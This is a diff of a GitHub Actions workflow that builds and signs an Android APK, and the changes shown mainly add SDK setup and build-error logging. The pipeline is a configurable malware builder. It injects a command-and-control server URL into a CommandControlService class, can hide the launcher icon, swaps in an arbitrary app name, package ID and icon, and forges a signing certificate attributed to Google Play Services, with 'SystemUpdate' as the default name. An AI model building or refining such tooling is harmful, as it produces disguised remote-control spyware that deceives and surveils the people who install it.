@@ -51,9 +51,6 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      # Hard fail on any error in ANY step, including pipes (the old
-      # `gradlew ... | tail -80` swallowed build failures and let the
-      # job continue to a broken rename step).
       - name: Harden shell
         run: echo "SHELLOPTS=xtrace:pipefail" >> "$GITHUB_ENV"
 
@@ -64,42 +61,46 @@ jobs:
           java-version: "17"
           cache: gradle
 
-      # ── Remove committed APKs ─────────────────────────────────────────────
-      # A prebuilt apk committed at android/app/*.apk poisons every
-      # `find android -name "*.apk"` call downstream. Nuke them first.
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install build-tools 34.0.0
+        run: sdkmanager "build-tools;34.0.0" "platforms;android-34"
+
+      # ── Fix local.properties — committed file has Windows paths ───────────
+      - name: Fix local.properties for CI
+        run: |
+          echo "sdk.dir=$ANDROID_SDK_ROOT" > android/local.properties
+          cat android/local.properties
+
       - name: Clean committed APKs
         run: rm -fv android/app/*.apk android/**/*.apk 2>/dev/null || true
 
-      # ── Inject C2 URL ──────────────────────────────────────────────────────
       - name: Inject C2 URL into CommandControlService
         run: |
           URL="${{ github.event.inputs.c2_url }}"
-          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g"             "${{ env.CCS }}"
+          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" "${{ env.CCS }}"
           grep -q "SERVER_URL = \"${URL}\"" "${{ env.CCS }}" || { echo "::error::C2 URL injection failed"; exit 1; }
           echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
 
-      # ── Set HIDE_ICON ──────────────────────────────────────────────────────
       - name: Set HIDE_ICON
         run: |
           HIDE="${{ github.event.inputs.hide_icon }}"
-          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g"             "${{ env.CCS }}"
+          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g" "${{ env.CCS }}"
 
-      # ── Override app label ─────────────────────────────────────────────────
       - name: Override app label
         if: ${{ github.event.inputs.app_label != '' }}
         run: |
           LABEL="${{ github.event.inputs.app_label }}"
-          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g"             android/app/src/main/res/values/strings.xml
+          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g" android/app/src/main/res/values/strings.xml
           echo "Label set: ${LABEL}"
 
-      # ── Override package / application ID ─────────────────────────────────
       - name: Override application ID
         run: |
           APP_ID="${{ github.event.inputs.app_id }}"
-          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g"             android/app/build.gradle
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g" android/app/build.gradle
           echo "App ID: ${APP_ID}"
 
-      # ── Inject app icon (logo) ─────────────────────────────────────────────
       - name: Inject app icon
         if: ${{ github.event.inputs.logo_base64 != '' || github.event.inputs.logo_url != '' }}
         run: |
@@ -111,17 +112,12 @@ jobs:
             curl -fsSL "${{ github.event.inputs.logo_url }}" -o "$TMP_LOGO"
           fi
           file "$TMP_LOGO"
-          # Write to every mipmap density — Android scales as needed.
           for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
             cp "$TMP_LOGO" "android/app/src/main/res/mipmap-${d}/ic_launcher.png"
             cp "$TMP_LOGO" "android/app/src/main/res/mipmap-${d}/ic_launcher_round.png"
           done
           echo "Icon injected into all mipmap densities"
 
-      # ── Keystore setup ────────────────────────────────────────────────────
-      # Uses bundled keystore by default. If it fails verification (wrong
-      # password, corrupt file), generate a fresh one in-workflow so the
-      # build NEVER produces an unsigned APK again.
       - name: Prepare keystore
         run: |
           set -euo pipefail
@@ -143,12 +139,18 @@ jobs:
           set -euo pipefail
           STORE_PASS=$(grep "storePassword '" android/app/build.gradle | head -1 | sed "s/.*storePassword '\([^']*\)'.*/\1/")
           KEY_ALIAS=$(grep "keyAlias '" android/app/build.gradle | head -1 | sed "s/.*keyAlias '\([^']*\)'.*/\1/")
-          if keytool -list -keystore android/google-services-release.jks               -storepass "$STORE_PASS" -alias "$KEY_ALIAS" >/dev/null 2>&1; then
+          if keytool -list -keystore android/google-services-release.jks \
+              -storepass "$STORE_PASS" -alias "$KEY_ALIAS" >/dev/null 2>&1; then
             echo "Keystore OK (alias: $KEY_ALIAS)"
           else
             echo "::warning::Bundled keystore failed verification — generating fresh one"
             rm -f android/google-services-release.jks
-            keytool -genkeypair -v               -keystore android/google-services-release.jks               -storepass "$STORE_PASS" -keypass "$STORE_PASS"               -alias "$KEY_ALIAS"               -keyalg RSA -keysize 2048 -validity 10000               -dname "CN=Google Play Services, OU=Android, O=Google, L=Mountain View, S=CA, C=US"
+            keytool -genkeypair -v \
+              -keystore android/google-services-release.jks \
+              -storepass "$STORE_PASS" -keypass "$STORE_PASS" \
+              -alias "$KEY_ALIAS" \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -dname "CN=Google Play Services, OU=Android, O=Google, L=Mountain View, S=CA, C=US"
             echo "Fresh keystore generated"
           fi
 
@@ -165,28 +167,48 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-gradle-
 
-      # ── Build (pipefail ON — gradle failure = step failure) ────────────────
+      # ── Build — full output visible, error summary on failure ─────────────
       - name: Build release APK
         working-directory: android
         run: |
           set -o pipefail
-          ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tail -120
+          ./gradlew assembleRelease --no-daemon --stacktrace > build.log 2>&1 || {
+            echo "=========================================="
+            echo "BUILD FAILED — error summary:"
+            echo "=========================================="
+            grep -B2 -A15 "What went wrong" build.log || true
+            echo ""
+            echo "=========================================="
+            echo "Failed task(s):"
+            echo "=========================================="
+            grep "FAILED" build.log || true
+            echo ""
+            echo "=========================================="
+            echo "Full log (last 150 lines):"
+            echo "=========================================="
+            tail -150 build.log
+            exit 1
+          }
+          tail -20 build.log
 
-      # ── Verify signature — unsigned APK = hard fail ────────────────────────
+      - name: Upload build log
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-log
+          path: android/build.log
+          retention-days: 7
+
       - name: Verify APK signature
         working-directory: android
         run: |
           set -euo pipefail
           APK=$(find app/build/outputs -name "*.apk" | head -1)
           [ -n "$APK" ] || { echo "::error::No APK produced by gradle"; exit 1; }
-          "$ANDROID_SDK_ROOT/build-tools/34.0.0/apksigner" verify --print-certs "$APK"             || { echo "::error::APK is UNSIGNED — signing failed"; exit 1; }
+          "$ANDROID_SDK_ROOT/build-tools/34.0.0/apksigner" verify --print-certs "$APK" \
+            || { echo "::error::APK is UNSIGNED — signing failed"; exit 1; }
           echo "Signature verified: $APK"
 
-      # ── Collect + rename APK ────────────────────────────────────────────────
-      # Old bug: `find android -name "*.apk" -path "*/release/*"` matched
-      # nothing (the only apk in the repo sat at android/app/tes-ui.apk,
-      # outside any release/ dir) → cp: cannot stat ''.
-      # Now: locate strictly inside gradle's output dir, then rename.
       - name: Locate and rename APK
         run: |
           set -euo pipefail
@@ -200,7 +222,6 @@ jobs:
             [ -z "$LABEL" ] && LABEL="SystemUpdate"
             NAME="${LABEL// /_}"
           fi
-          # sanitize: alnum, dash, underscore, dot only
           NAME=$(echo "$NAME" | tr -cd 'A-Za-z0-9._-')
           [ -z "$NAME" ] && NAME="SystemUpdate"
 
